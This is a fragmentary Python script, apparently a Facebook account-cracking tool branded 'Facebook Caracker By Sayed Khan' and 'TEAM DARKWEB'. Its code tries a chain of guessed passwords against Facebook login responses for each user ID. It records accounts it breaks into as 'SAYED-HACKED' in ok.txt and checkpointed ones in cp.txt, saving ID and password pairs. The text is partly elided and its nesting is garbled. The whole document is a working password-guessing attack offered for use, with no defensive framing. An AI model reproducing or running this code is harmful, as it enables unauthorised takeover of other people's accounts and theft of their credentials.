...
\033[1;91m ║╚═╝║╔═╗║─║║─║╚══╦╝╚╝║
\033[1;92m ╚═══╩╝─╚╝─╚╝─╚═══╩═══╝ 
      [\033[1;97m\033[1;41m Facebook Caracker By Sayed Khan \033[0m]
\033[1;37m  ╔══════════════════════════════════════╗
\033[1;37m  ║  ➤ \033[1;33mAUTHOR   \033[1;31m: \033[1;92mTEAM DARKWEB           \033[1;37m║
\033[1;37m  ║  ➤ \033[1;33mVERSION  \033[1;31m: \033[1;92m1.00                   \033[1;37m║
\033[1;37m  ║  ➤ \033[1;33mFACEBOOK \033[1;31m: \033[1;92mwww.fb.com/S4YED10     \033[1;37m║
\033[1;37m  ╚══════════════════════════════════════╝"""
def main():
    os.system("clear")
    print logo
    ...
    print(" ➤ \033[1;97m[2] FOLLOW Me On Facebook ")
...
def main_select():
    ...
    if Mz  =="1":
        login()
    if Mz =="2":
        os.system("xdg-open https://www.facebook.com/S4YED10")
	main()   
    elif Mz =="0":
        os.system("exit")
    else:
	...
	def main(arg):
		...
		try:
		    ...
		    if 'www.facebook.com' in d['error_msg']:
		        print("\x1b[1;97m[\x1b[1;97mSAYED-CP\x1b[1;97m]\x1b[1;91m "+uid+"\x1b[1;97m | \x1b[1;91m"+pass1+"\x1b[1;97m | \x1b[1;92m"+name)
		        cp=open("cp.txt","a")
		        cp.write(uid+" | "+pass1+"\n")
		        cp.close()
		        cps.append(uid)
		    	...
		    	if "access_token" in d:
		            print("\t\x1b[1;92m[SAYED-HACKED] "+uid+" | "+pass1+" | "+name)
		            ok=open("ok.txt","a")
		            ok.write(uid+" | "+pass1+"\n")
		            ok.close()
		            oks.append(uid)
		            ...
		            if 'www.facebook.com' in d['error_msg']:
		                ...
		                if 'access_token' in d:
		                    print("\t\x1b[1;92m[SAYED-HACKED] "+uid+" | "+pass2+" | "+name)
		                    ok=open("ok.txt","a")
		                    ok.write(uid+" | "+pass2+"\n")
		                    ok.close()
		                    oks.append(uid)
		                    ...
		                    if 'www.facebook.com' in d['error_msg']:
		                        ...
		                        if 'access_token' in d:
		                            print("\t\x1b[1;92m[SAYED-HACKED] "+uid+" | "+pass3+" | "+name)
		                            ok=open("ok.txt","a")
		                            ok.write(uid+" | "+pass3+"\n")
		                            ok.close()
		                            oks.append(uid)
		                            ...
		                            if 'www.facebook.com' in d['error_msg']:
		                                ...
		                                if 'access_token' in d:
		                                    print("\t\x1b[1;92m[SAYED-HACKED] "+uid+" | "+pass4+" | "+name)
		                                    ok=open("ok.txt","a")
		                                    ok.write(uid+" | "+pass4+"\n")
		                                    ok.close()
		                                    oks.append(uid)
		                                    ...
		                                    d=json.loads(q)
		                                    if 'www.facebook.com' in d['error_msg']:
		                                        print("\x1b[1;97m[\x1b[1;97mSAYED-CP\x1b[1;97m]\x1b[1;91m "+uid+"\x1b[1;97m | \x1b[1;91m"+pass5+"\x1b[1;97m | \x1b[1;92m"+name)
		                                        cp=open("cp.txt","a")
		                                        cp.write(uid+" | "+pass5+"\n")
		                                        cp.close()
		                                        cps.append(uid)
		                                        ...
		                                        if 'access_token' in d:
		                                            print("\t\x1b[1;92m[SAYED-HACKED] "+uid+" | "+pass5+" | "+name)
		                                            ok=open("ok.txt","a")
		                                            ok.write(uid+" | "+pass5+"\n")
		                                            ok.close()
		                                            oks.append(uid)
		                                            ...
		                                            d=json.loads(q)
		                                            if 'www.facebook.com' in d['error_msg']:
		                                                print("\x1b[1;97m[\x1b[1;97mSAYED-CP\x1b[1;97m]\x1b[1;91m "+uid+"\x1b[1;97m | \x1b[1;91m"+pass6+"\x1b[1;97m | \x1b[1;92m"+name)
		                                                cp=open("cp.txt","a")
		                                                cp.write(uid+" | "+pass6+"\n")
		                                                cp.close()
		                                                cps.append(uid)
		                                                ...
		                                                if 'access_token' in d:
		                                                    print("\t\x1b[1;92m[SAYED-HACKED] "+uid+" | "+pass6+" | "+name)
		                                                    ok=open("ok.txt","a")
		                                                    ok.write(uid+" | "+pass6+"\n")
		                                                    ok.close()
		                                                    oks.append(uid)
		                                                    ...
		                                                    d=json.loads(q)
		                                                    if 'www.facebook.com' in d['error_msg']:
		                                                        print("\x1b[1;97m[\x1b[1;97mSAYED-CP\x1b[1;97m]\x1b[1;91m "+uid+"\x1b[1;97m | \x1b[1;91m"+pass7+"\x1b[1;97m | \x1b[1;92m"+name)
		                                                        cp=open("cp.txt","a")
		                                                        cp.write(uid+" | "+pass7+"\n")
		                                                        cp.close()
		                                                        cps.append(uid)
		                                                        ...
		                                                        if 'access_token' in d:
		                                                            print("\t\x1b[1;92m[SAYED-HACKED] "+uid+" | "+pass7+" | "+name)
		                                                            ok=open("ok.txt","a")
		                                                            ok.write(uid+" | "+pass7+"\n")
		                                                            ok.close()
		                                                            oks.append(uid)
		                                                            ...
		                                                            d=json.loads(q)
		                                                            if 'www.facebook.com' in d['error_msg']:
		                                                                print("\x1b[1;97m[\x1b[1;97mSAYED-CP\x1b[1;97m]\x1b[1;91m "+uid+"\x1b[1;97m | \x1b[1;91m"+pass8+"\x1b[1;97m | \x1b[1;92m"+name)
		                                                                cp=open("cp.txt","a")
		                                                                cp.write(uid+" | "+pass8+"\n")
		                                                                cp.close()
		                                                                cps.append(uid)
		                                                                ...
		                                                                if 'access_token' in d:
		                                                                    print("\t\x1b[1;92m[SAYED-HACKED] "+uid+" | "+pass8+" | "+name)
		                                                                    ok=open("ok.txt","a")
		                                                                    ok.write(uid+" | "+pass8+"\n")
		                                                                    ok.close()
		                                                                    oks.append(uid)
		                                                                    ...
		                                                                    d=json.loads(q)
		                                                                    if 'www.facebook.com' in d['error_msg']:
		                                                                        print("\x1b[1;97m[\x1b[1;97mSAYED-HACKED\x1b[1;97m]\x1b[1;91m "+uid+"\x1b[1;97m | \x1b[1;91m"+pass9+"\x1b[1;97m | \x1b[1;92m"+name)
		                                                                        cp=open("cp.txt","a")
		                                                                        cp.write(uid+" | "+pass9+"\n")
		                                                                        cp.close()
		                                                                        cps.append(uid)
		                                                                        ...
		                                                                        if 'access_token' in d:
		                                                                            print("\t\x1b[1;92m[SAYED-HACKED] "+uid+" | "+pass9+" | "+name)
		                                                                            ok=open("ok.txt","a")
		                                                                            ok.write(uid+" | "+pass9+"\n")
		                                                                            ok.close()
		                                                                            oks.append(uid)
		                                                                            ...
		                                                                            d=json.loads(q)
		                                                                            if 'www.facebook.com' in d['error_msg']:
		                                                                                print("\x1b[1;97m[\x1b[1;97mSAYED-CP\x1b[1;97m]\x1b[1;91m "+uid+"\x1b[1;97m | \x1b[1;91m"+pass10+"\x1b[1;97m | \x1b[1;92m"+name)
		                                                                                cp=open("cp.txt","a")
		                                                                                cp.write(uid+" | "+pass10+"\n")
		                                                                                cp.close()
		                                                                                cps.append(uid)
		                                                                                ...
		                                                                                if 'access_token' in d:
		                                                                                    print("\t\x1b[1;92m[SAYED-HACKED] "+uid+" | "+pass10+" | "+name)
		                                                                                    ok=open("ok.txt","a")
		                                                                                    ok.write(uid+" | "+pass10+"\n")
		                                                                                    ok.close()
		                                                                                    oks.append(uid)
		                                                                                    ...
		                                                                                    d=json.loads(q)
		                                                                                    if 'www.facebook.com' in d['error_msg']:
		                                                                                        print("\x1b[1;97m[\x1b[1;97mSAYED-CP\x1b[1;97m]\x1b[1;91m "+uid+"\x1b[1;97m | \x1b[1;91m"+pass11+"\x1b[1;97m | \x1b[1;92m"+name)
		                                                                                        cp=open("cp.txt","a")
		                                                                                        cp.write(uid+" | "+pass11+"\n")
		                                                                                        cp.close()
		                                                                                        cps.append(uid)
		                                                                                        ...
		                                                                                        if 'access_token' in d:
		                                                                                            print("\t\x1b[1;92m[SAYED-HACKED] "+uid+" | "+pass11+" | "+name)
		                                                                                            ok=open("ok.txt","a")
		                                                                                            ok.write(uid+" | "+pass11+"\n")
		                                                                                            ok.close()
		                                                                                            oks.append(uid)
